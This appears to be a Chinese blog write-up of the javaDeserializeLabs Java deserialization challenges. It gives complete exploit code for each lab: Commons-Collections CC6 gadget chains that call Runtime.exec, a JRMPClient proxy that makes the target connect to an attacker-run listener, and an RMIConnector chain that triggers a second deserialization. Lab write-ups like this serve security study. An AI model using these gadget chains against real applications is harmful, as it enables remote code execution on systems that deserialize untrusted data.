---
created: '22/03/31'
title: javaDeserializeLabs writeup
tags:
  - java
  - java安全
  - 反序列化
---
# javaDeserializeLabs writeup
题目地址: https://github.com/waderwu/javaDeserializeLabs

## lab1-basic
jar包解压后的目录如下，主要关注自己写的类:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331131459.png)

发现存在一个Calc类可以直接给我们作为反序列化，其代码如下:
```java
package com.yxxx.javasec.deserialize;

import java.io.ObjectInputStream;
import java.io.Serializable;

public class Calc implements Serializable {
    private boolean canPopCalc = false;
    private String cmd = "ls -al";

    public Calc() {
    }

    private void readObject(ObjectInputStream objectInputStream) throws Exception {
        objectInputStream.defaultReadObject();
        if (this.canPopCalc) {
            Runtime.getRuntime().exec(this.cmd);
        }

    }
}
```

那么exp就很好写了，反射一下修改属性即可。
```java
package com.yxxx.javasec.deserialize;


import java.lang.reflect.Field;

public class Exp {
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }



    public static void main(String[] args) throws Exception {
        Calc c = new Calc();
        setFieldValue(c, "canPopCalc", true);
        setFieldValue(c, "cmd", "touch /tmp/success");

        System.out.println(Utils.objectToHexString(c));
    }

}
```

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331131636.png)

## lab2-ysoserial
jar包解压后的目录如下，主要关注自己写的类和pom.xml:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331133027.png)

在pom.xml中存在cc3.2.1的依赖，这样一来就很简单了:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.4.4</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>demo</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>javaDeserializeLabs</name>
    <description>javaDeserializeLabs</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```


再看看反序列化的类，需要额外往序列化流里写一个UTF和INT，这个问题不大，我们按照顺序重新写一遍就好了，但是这样就不能直接用ysoserial打了:
```java
package com.yxxx.javasec.deserialize;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class IndexController {
    public IndexController() {
    }

    @RequestMapping({"/basic"})
    public String greeting(@RequestParam(name = "data",required = true) String data, Model model) throws Exception {
        byte[] b = Utils.hexStringToBytes(data);
        InputStream inputStream = new ByteArrayInputStream(b);
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        String name = objectInputStream.readUTF();
        int year = objectInputStream.readInt();
        if (name.equals("SJTU") && year == 1896) {
            objectInputStream.readObject();
        }
        return "index";
    }
}
```

手动构造payload，选择较为通用的CC6作为反序列化链，最终exp如下:
```java
package top.longlone;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static Object getPayload(String cmd) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd}),
                new ConstantTransformer(1),
        };

        // 先使用fakeTransformer防止本地命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keykey");

        Map objMap = new HashMap();
        objMap.put(tiedMapEntry, "valuevalue");
        outerMap.remove("keykey");

        // 使用反射替换transformerChain的transformers
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        return objMap;
    }

    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeUTF("SJTU");
        oos.writeInt(1896);
        oos.writeObject(getPayload("touch /tmp/success"));

        oos.close();

        System.out.println(Utils.bytesTohexString(barr.toByteArray()));

    }
}
```

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331133552.png)

## lab3-shiro-jrmp
照惯例看看jar包下的东西，目录如下，这里多出了一个MyObjectInputStream:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331142340.png)

查看MyObjectInputStream代码，这个类在反序列化的时候用到了，代替了java默认的ObjectInputStream:
```java
package com.yxxx.javasec.deserialize;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.net.URL;
import java.net.URLClassLoader;
import org.apache.commons.collections.Transformer;

public class MyObjectInputStream extends ObjectInputStream {
    private ClassLoader classLoader;

    public MyObjectInputStream(InputStream inputStream) throws Exception {
        super(inputStream);
        URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();
        this.classLoader = new URLClassLoader(urls);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        Class clazz = this.classLoader.loadClass(desc.getName());
        return clazz;
    }
}
```

再看看pom.xml，和lab2一样，题目名字里写的是shiro，但是并没有shiro:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.4.4</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>demo</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>javaDeserializeLabs</name>
    <description>javaDeserializeLabs</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

题目看完了，难点实际上就在于MyInputStream这个类，其使用了`classLoader.loadClass()`而非默认的`Class.forName()`去加载类，两者主要的不同点在于不能够加载数组，比如:
```java
Class.forName("[[B");	// class [[B
ClassLoader.getSystemClassLoader().loadClass("[[B");	// ClassNotFoundException
```

这样一来，我们之前的payload都无法使用了，不管是TemplatesImpl还是Transformer链，都涉及到数组(前者是bytes二维数组，后者是Transformer数组)。

那么这道题要如何做呢？实际上这里涉及到二次反序列化，一谈到二次反序列化，我们很容易想到JRMP/RMI那一套，也就是让服务端反序列化一个JRMPClient，向我们恶意的Registry发送请求，触发二次反序列化。

题目环境是jdk8u222，我们知道在jdk8u121之后java增加了JEP 290的防御机制，但是这是可以绕过的，这里就不再展开了，可以参考博客中的RMI文章。

最终构造的exp如下，参考了ysoserial的JRMPClient，由于要往序列化流里写入额外数据，所以不能直接用ysoserial构造:
```java
package com.yxxx.javasec.deserialize;  
  
  
import sun.rmi.server.UnicastRef;  
import sun.rmi.transport.LiveRef;  
import sun.rmi.transport.tcp.TCPEndpoint;  
  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Proxy;  
import java.rmi.registry.Registry;  
import java.rmi.server.ObjID;  
import java.rmi.server.RemoteObjectInvocationHandler;  
import java.util.Random;  
  
public class Exp3 {  
 public static void main(String[] args) throws Exception {  
 ObjID id = new ObjID(new Random().nextInt()); // RMI registry  
 TCPEndpoint te = new TCPEndpoint("172.21.208.1", 23333);  
 UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));  
 RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);  
 Registry proxy = (Registry) Proxy.newProxyInstance(Exp3.class.getClassLoader(), new Class[]{  
 Registry.class  
 }, obj);  
  
 ByteArrayOutputStream barr = new ByteArrayOutputStream();  
 ObjectOutputStream oos = new ObjectOutputStream(barr);  
 oos.writeUTF("SJTU");  
 oos.writeInt(1896);  
 oos.writeObject(proxy);  
 oos.close();  
  
 System.out.println(Utils.bytesTohexString(barr.toByteArray()));  
 }  
}
```
本地再使用ysoserial启动JRMPListener:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331144145.png)

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220331144157.png)


## lab4-shiro-blind
这道题与第三题题目完全一样，但是在docker层设置了不能出网，也就是说我们要在不能出网的情况下利用其自定义的InputStream(不能反序列化数组)来实现任意代码执行。

这时候我们的目光就要回到CC链，在CC链中我们的sink(终点)实际上只有2个，一个是利用`TemplatesImpl`类实现任意java代码执行，一个是利用`ChainedTransformer`类链式调用实现任意命令执行，但是这两者在这道题都没办法使用，前者使用了`byte[][]`，而后者则使用了`Transforme[]`。

我们再把目光往前看，假如无法使用`ChainedTransformer`类实现链式调用，实际上我们还可以使用其中的任意一个`Transformer`类，这里我们将目光放到`InvokerTransformer`类，其可以调用任意实例的任意方法。

但是我们发现`InvokerTransformer`类的第二，第三个参数都是一个数组，分别对应方法的参数类型和参数值，由于我们无法反序列化数组，所以第二，第三个参数必须为null，换句话说我们只能调用一个任意实例的无参数方法。

现在我们再来思考解题，在第三题中，我们提到了二次反序列化的概念，在不使用JNDI的情况下，是否存在一个类(且需要利用到的属性中不存在数组)，存在一个无参数的方法，最终能够实现二次反序列化呢？

经过一番查找之后，我们找到了`javax.management.remote.rmi.RMIConnector`这个类，其`findRMIServerJRMP`方法如下，可以看到这个方法将传入的字符串base64解码后二次反序列化，非常符合我们的要求:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220403101248.png)

通过find usage的功能，我们找到了其利用链:
```
connect() -->
	connect(Map environment) -->
		findRMIServer() -->
			findRMIServerJRMP() --> readObject()
```

利用链中的关键代码如下，`findRMIServer`方法传入了一个`JMXSrviceURL`，并且判断url的path是否以`/stub/`开头:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220403101841.png)

通过查询资料发现，`JXMServiceURL`符合`service:jmx:protocol:sap`这个规范，我们只需要构造这样一个URL即可：
```
service:jmx:(iiop|rmi)://127.0.0.1:23333/stub/{$payload}
```

最后exp如下:
```java
package top.longlone;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static String getCC6Payload(String cmd) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd}),
                new ConstantTransformer(1),
        };

        // 先使用fakeTransformer防止本地命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keykey");

        Map objMap = new HashMap();
        objMap.put(tiedMapEntry, "valuevalue");
        outerMap.clear();

        // 使用反射替换transformerChain的transformers
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(objMap);

        return Base64.getEncoder().encodeToString(barr.toByteArray());
    }

    public static Object getPayload(String cmd) throws Exception {


        RMIConnector connector = new RMIConnector(new JMXServiceURL("service:jmx:iiop://127.0.0.1:8000/stub/{$payload}".replace("{$payload}", getCC6Payload(cmd))), null);

        Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
        java.util.Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, connector);

        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.clear();
        Utils.setFieldValue(invokerTransformer, "iMethodName", "connect");

        return expMap;
    }

    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeUTF("SJTU");
        oos.writeInt(1896);
        oos.writeObject(getPayload("touch /tmp/success"));
        oos.close();
        System.out.println(Utils.bytesTohexString(barr.toByteArray()));

    }
}
```

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220403103339.png)
